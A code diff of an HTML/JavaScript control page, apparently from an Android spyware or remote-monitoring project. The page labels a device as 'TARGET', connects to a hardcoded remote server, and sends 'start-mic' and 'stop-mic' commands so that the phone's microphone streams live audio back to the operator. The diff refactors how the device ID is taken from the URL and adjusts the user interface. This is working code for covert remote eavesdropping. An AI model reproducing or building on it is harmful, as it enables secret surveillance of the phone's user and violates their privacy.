@@ -47,7 +47,7 @@
         }
         .btn:hover { background: #333; transform: scale(1.05); }
         .btn.active { background: var(--accent); color: black; border-color: var(--accent); box-shadow: 0 0 15px rgba(0,255,136,0.4); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn.stop:hover { background: #ff4444; border-color: #ff4444; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
         
         #statusText { font-family: 'Courier New', monospace; letter-spacing: 1px; }
 
@@ -55,12 +55,12 @@
 </head>
 <body>
     <div class="header">
-        <div onclick="window.history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</div>
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
         <h3>Live Audio Stream</h3>
     </div>
 
     <div class="device-info">
-        TARGET: <span id="targetDisplay">SEARCHING...</span>
+        TARGET: <span id="targetDisplay">LOADING...</span>
     </div>
 
     <div class="mic-container">
@@ -73,7 +73,7 @@
             <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
             <div class="bar"></div><div class="bar"></div>
         </div>
-        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">WAITING FOR START...</p>
+        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">READY TO CONNECT</p>
     </div>
 
     <div class="controls">
@@ -88,40 +88,32 @@
     </div>
 
     <script>
-        const SERVER_URL = window.location.origin;
+        // 🔥 Server URL (Wahi jo Call History me tha)
+        const SERVER_URL = "https://child-v9no.onrender.com"; 
+
+        // 🔥 ID Logic (Bilkul Call History jaisa)
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id'); // Ab ye link se ?id=WALA_ID uthayega
+
         let socket;
         let audioContext;
         let nextTime = 0;
         let isStreaming = false;
-        let currentDeviceId = null;
 
-        // 🔥 1. ID PATA KARNE KA LOGIC (URL se ya Storage se)
+        // 🔥 Page Load Check (Agar ID nahi hai to bhaga do)
         window.onload = function() {
-            // Step A: URL check karo (?deviceId=xxxx)
-            const urlParams = new URLSearchParams(window.location.search);
-            currentDeviceId = urlParams.get('deviceId');
-
-            // Step B: Agar URL me nahi hai, to LocalStorage check karo (Fallback)
-            if (!currentDeviceId) {
-                currentDeviceId = localStorage.getItem("active_device_id");
+            if (!DEVICE_ID) {
+                alert("ID Missing! Please select a device first.");
+                window.location.href = "index.html"; // Wapas bhej do agar ID nahi hai
+                return;
             }
-
-            // UI Update
-            if (!currentDeviceId) {
-                document.getElementById('targetDisplay').innerText = "❌ NO ID FOUND";
-                document.getElementById('statusText').innerText = "Error: Invalid Link";
-                document.getElementById('startBtn').disabled = true;
-                alert("Device ID nahi mili! Link check karein.");
-            } else {
-                document.getElementById('targetDisplay').innerText = currentDeviceId;
-                document.getElementById('statusText').innerText = "READY: " + currentDeviceId;
-            }
+            document.getElementById('targetDisplay').innerText = DEVICE_ID;
         };
 
         function connectAndListen() {
-            if (!currentDeviceId) return;
+            if (!DEVICE_ID) return;
 
-            // Audio Context Rule: User interaction required
+            // Audio Context Start
             if (!audioContext) {
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
             }
@@ -138,12 +130,12 @@
             socket.on("connect", () => {
                 console.log("Connected to Server");
                 
-                // 🔥 Join Room with Specific ID
-                socket.emit("join", currentDeviceId);
+                // 🔥 ID wala Room Join karo
+                socket.emit("join", DEVICE_ID);
                 
-                // 🔥 Send Command to Android to start Mic
+                // Phone ko bolo Mic On kare
                 socket.emit("control-event", {
-                    room: currentDeviceId,
+                    room: DEVICE_ID,
                     action: "start-mic"
                 });
                 
@@ -164,20 +156,26 @@
             });
         }
 
-        // --- AUDIO PLAYER (PCM) ---
+        // --- AUDIO PLAYER ---
         function playPcmChunk(arrayBuffer) {
             if (!audioContext) return;
             const int16Array = new Int16Array(arrayBuffer);
             const float32Array = new Float32Array(int16Array.length);
+
             for (let i = 0; i < int16Array.length; i++) {
                 float32Array[i] = int16Array[i] / 32768; 
             }
+
             const audioBuffer = audioContext.createBuffer(1, float32Array.length, 44100);
             audioBuffer.getChannelData(0).set(float32Array);
+
             const source = audioContext.createBufferSource();
             source.buffer = audioBuffer;
             source.connect(audioContext.destination);
-            if (nextTime < audioContext.currentTime) nextTime = audioContext.currentTime;
+
+            if (nextTime < audioContext.currentTime) {
+                nextTime = audioContext.currentTime;
+            }
             source.start(nextTime);
             nextTime += source.buffer.duration;
             animateBars();
@@ -186,8 +184,12 @@
         function stopListen() {
             isStreaming = false;
             if (socket) {
-                if(currentDeviceId) {
-                    socket.emit("control-event", { room: currentDeviceId, action: "stop-mic" });
+                // Mic Off Command
+                if(DEVICE_ID) {
+                    socket.emit("control-event", {
+                        room: DEVICE_ID,
+                        action: "stop-mic"
+                    });
                 }
                 socket.disconnect();
                 socket = null;
